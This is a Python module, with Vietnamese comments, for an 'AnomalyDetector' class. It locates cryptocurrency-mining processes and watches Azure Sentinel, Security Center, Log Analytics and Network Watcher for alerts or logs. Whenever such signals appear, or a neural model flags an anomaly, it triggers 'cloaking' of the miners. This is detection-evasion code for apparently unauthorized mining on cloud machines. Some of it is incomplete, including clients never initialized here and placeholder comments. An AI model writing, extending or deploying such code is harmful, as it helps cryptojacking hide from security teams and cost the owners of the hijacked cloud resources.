# anomaly_detector.py

import torch
import psutil
import pynvml
import logging
from time import sleep, time
from pathlib import Path
from threading import Lock, Event, Thread
from typing import List, Any, Dict

from base_manager import BaseManager
from utils import MiningProcess
import temperature_monitor


class AnomalyDetector(BaseManager):
    """
    Lớp phát hiện bất thường, giám sát baseline và áp dụng cloaking khi cần thiết.
    Kế thừa từ BaseManager để sử dụng các phương thức chung.
    """
    _instance = None
    _instance_lock = Lock()

    def __new__(cls, *args, **kwargs):
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(AnomalyDetector, cls).__new__(cls)
        return cls._instance

    def __init__(self, config: Dict[str, Any], model_path: Path, logger: logging.Logger):
        super().__init__(config, logger)
        if hasattr(self, '_initialized') and self._initialized:
            return
        self._initialized = True

        # Tải mô hình AI riêng cho Anomaly Detection
        self.anomaly_cloaking_model, self.anomaly_cloaking_device = self.load_model(model_path)

        # Sự kiện để dừng các luồng
        self.stop_event = Event()

        # Danh sách tiến trình khai thác
        self.mining_processes = []
        self.mining_processes_lock = Lock()

        # Khởi tạo luồng phát hiện bất thường
        self.anomaly_thread = Thread(target=self.anomaly_detection, name="AnomalyDetectionThread", daemon=True)

        # Initialize NVML once
        try:
            pynvml.nvmlInit()
            self.gpu_initialized = True
            self.logger.info("NVML initialized successfully.")
        except pynvml.NVMLError as e:
            self.logger.error(f"Failed to initialize NVML: {e}")
            self.gpu_initialized = False

        # Trì hoãn việc import ResourceManager để tránh phụ thuộc vòng
        self.resource_manager = None

    def set_resource_manager(self, resource_manager):
        """
        Thiết lập ResourceManager sau khi đã khởi tạo toàn bộ hệ thống.
        """
        self.resource_manager = resource_manager
        self.logger.info("ResourceManager has been set for AnomalyDetector.")

    def start(self):
        self.logger.info("Starting AnomalyDetector...")
        self.anomaly_thread.start()
        self.logger.info("AnomalyDetector started successfully.")

    def stop(self):
        self.logger.info("Stopping AnomalyDetector...")
        self.stop_event.set()
        self.anomaly_thread.join()
        if self.gpu_initialized:
            try:
                pynvml.nvmlShutdown()
                self.logger.info("NVML shutdown successfully.")
            except pynvml.NVMLError as e:
                self.logger.error(f"Failed to shutdown NVML: {e}")
        self.logger.info("AnomalyDetector stopped successfully.")

    def discover_mining_processes(self):
        """
        Phát hiện các tiến trình khai thác dựa trên cấu hình từ tệp cấu hình.
        """
        cpu_process_name = self.config['processes']['CPU']
        gpu_process_name = self.config['processes']['GPU']

        with self.mining_processes_lock:
            self.mining_processes.clear()
            for proc in psutil.process_iter(['pid', 'name']):
                proc_name = proc.info['name'].lower()
                if cpu_process_name.lower() in proc_name or gpu_process_name.lower() in proc_name:
                    priority = self.get_process_priority(proc.info['name'])
                    network_interface = self.config.get('network_interface', 'eth0')
                    mining_proc = MiningProcess(proc.info['pid'], proc.info['name'], priority, network_interface)
                    self.mining_processes.append(mining_proc)
            self.logger.info(f"Discovered {len(self.mining_processes)} mining processes.")

    def get_process_priority(self, process_name: str) -> int:
        """
        Lấy mức độ ưu tiên của tiến trình từ cấu hình.
        """
        priority_map = self.config.get('process_priority_map', {})
        return priority_map.get(process_name.lower(), 1)

    def anomaly_detection(self):
        """
        Luồng phát hiện bất thường và gửi yêu cầu cloaking nếu cần.
        """
        detection_interval = self.config.get("ai_driven_monitoring", {}).get("detection_interval_seconds", 60)
        cloak_activation_delay = self.config.get("ai_driven_monitoring", {}).get("cloak_activation_delay_seconds", 5)
        last_detection_time = 0

        while not self.stop_event.is_set():
            current_time = time()
            if current_time - last_detection_time < detection_interval:
                sleep(1)
                continue

            last_detection_time = current_time

            try:
                self.discover_mining_processes()

                if self.resource_manager is None:
                    self.logger.error("ResourceManager is not set. Cannot proceed with anomaly detection.")
                    continue

                with self.mining_processes_lock:
                    for process in self.mining_processes:
                        process.update_resource_usage()
                        current_state = self.collect_metrics(process)

                        # Thu thập dữ liệu từ Azure Sentinel
                        alerts = self.azure_sentinel_client.get_recent_alerts(days=1)
                        if alerts:
                            self.logger.warning(f"Detected {len(alerts)} alerts from Azure Sentinel for PID: {process.pid}")
                            self.resource_manager.cloaking_request_queue.put(process)
                            continue  # Cloak immediately

                        # Thu thập dữ liệu từ Azure Log Analytics
                        for vm in self.resource_manager.vms:
                            query = f"Heartbeat | where Computer == '{vm['name']}' | summarize AggregatedValue = avg(CPUUsage) by bin(TimeGenerated, 5m)"
                            logs = self.azure_log_analytics_client.query_logs(query)
                            if logs:
                                # Process logs and determine anomalies
                                self.logger.warning(f"Detected logs from Azure Log Analytics for VM {vm['name']}.")
                                self.resource_manager.cloaking_request_queue.put(process)
                                break  # Cloak immediately

                        # Thu thập dữ liệu từ Azure Security Center
                        recommendations = self.azure_security_center_client.get_security_recommendations()
                        if recommendations:
                            self.logger.warning(f"Detected {len(recommendations)} security recommendations from Azure Security Center.")
                            self.resource_manager.cloaking_request_queue.put(process)
                            continue

                        # Thu thập dữ liệu từ Azure Network Watcher
                        for nsg in self.resource_manager.nsgs:
                            flow_logs = self.azure_network_watcher_client.get_flow_logs(
                                resource_group=nsg['resourceGroup'],
                                network_watcher_name=self.resource_manager.network_watchers[0]['name'] if self.resource_manager.network_watchers else 'unknown',
                                nsg_name=nsg['name']
                            )
                            if flow_logs:
                                self.logger.warning(f"Detected flow logs from Azure Network Watcher for NSG {nsg['name']}.")
                                self.resource_manager.cloaking_request_queue.put(process)
                                break

                        # Thu thập dữ liệu từ Azure Traffic Analytics (nếu cần)
                        traffic_data = self.azure_traffic_analytics_client.get_traffic_data()
                        if traffic_data:
                            self.logger.warning(f"Detected traffic anomalies from Azure Traffic Analytics for PID: {process.pid}")
                            self.resource_manager.cloaking_request_queue.put(process)
                            continue

                        # Thu thập dữ liệu từ Azure ML Clusters (nếu cần)
                        for ml_cluster in self.resource_manager.ml_clusters:
                            # Implement any specific checks or data collection for ML Clusters if necessary
                            self.logger.info(f"Checking data from Azure ML Cluster: {ml_cluster['name']}")
                            # Placeholder: Add specific logic if needed

                        # Tiếp tục với phân tích mô hình AI
                        input_features = self.prepare_input_features(current_state)
                        input_tensor = torch.tensor(input_features, dtype=torch.float32).to(self.anomaly_cloaking_device)
                        input_tensor = input_tensor.unsqueeze(0)

                        with torch.no_grad():
                            prediction = self.anomaly_cloaking_model(input_tensor)
                            anomaly_score = prediction.item()

                        self.logger.debug(f"Anomaly score for process {process.name} (PID: {process.pid}): {anomaly_score}")

                        detection_threshold = self.config['ai_driven_monitoring']['anomaly_cloaking_model']['detection_threshold']
                        is_anomaly = anomaly_score > detection_threshold

                        if is_anomaly:
                            self.logger.warning(f"Anomaly detected in process {process.name} (PID: {process.pid}). Initiating cloaking in {cloak_activation_delay} seconds.")
                            sleep(cloak_activation_delay)
                            self.resource_manager.cloaking_request_queue.put(process)

            except Exception as e:
                self.logger.error(f"Error in anomaly_detection: {e}")
            sleep(1)  # Sleep briefly to prevent tight loop

    def collect_metrics(self, process: MiningProcess) -> Dict[str, Any]:
        """
        Thu thập các chỉ số tài nguyên của tiến trình.
        """
        current_state = {
            'cpu_percent': process.cpu_usage,
            'cpu_count': psutil.cpu_count(logical=True),
            'cpu_freq_mhz': temperature_monitor.get_cpu_freq(process.pid),
            'ram_percent': process.memory_usage,
            'ram_total_mb': psutil.virtual_memory().total / (1024 * 1024),
            'ram_available_mb': psutil.virtual_memory().available / (1024 * 1024),
            'cache_percent': temperature_monitor.get_cache_percent(),
            'gpus': [
                {
                    'gpu_percent': process.gpu_usage,
                    'memory_percent': temperature_monitor.get_gpu_memory_percent(process.pid),
                    'temperature_celsius': temperature_monitor.get_gpu_temperature(process.pid)
                }
            ],
            'disk_io_limit_mbps': process.disk_io,
            'network_bandwidth_limit_mbps': process.network_io
        }
        self.logger.debug(f"Collected metrics for process {process.name} (PID: {process.pid}): {current_state}")
        return current_state

    def prepare_input_features(self, current_state: Dict[str, Any]) -> List[float]:
        """
        Chuẩn bị các đặc trưng đầu vào cho mô hình AI từ trạng thái hiện tại.
        """
        input_features = [
            current_state['cpu_percent'],
            current_state['cpu_count'],
            current_state['cpu_freq_mhz'],
            current_state['ram_percent'],
            current_state['ram_total_mb'],
            current_state['ram_available_mb'],
            current_state['cache_percent']
        ]

        for gpu in current_state['gpus']:
            input_features.extend([
                gpu['gpu_percent'],
                gpu['memory_percent'],
                gpu['temperature_celsius']
            ])

        input_features.extend([
            current_state['disk_io_limit_mbps'],
            current_state['network_bandwidth_limit_mbps']
        ])

        self.logger.debug(f"Prepared input features for AI model: {input_features}")
        return input_features
